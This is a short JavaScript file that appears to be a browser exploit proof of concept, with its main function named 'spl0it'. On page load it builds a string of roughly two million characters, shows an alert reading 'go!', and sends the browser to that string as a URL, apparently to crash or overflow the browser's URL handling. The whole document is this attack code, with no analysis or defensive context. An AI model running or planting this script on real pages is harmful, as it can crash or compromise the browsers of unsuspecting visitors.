var k=0x800;
function crs(k){
	s="";
	var j=32;
	while(j<k){
		s+=String.fromCharCode(j);
		j++;
	};
	return s;
};

function rep(s,n){
	k=0;
	st="";
	while(k<n){
		st+=s;
		k++;
	};
	return st;
};

function spl0it(){
	var s=rep(crs(k),1024);
	alert('go! ');
	location.href=s;
};

spl0it();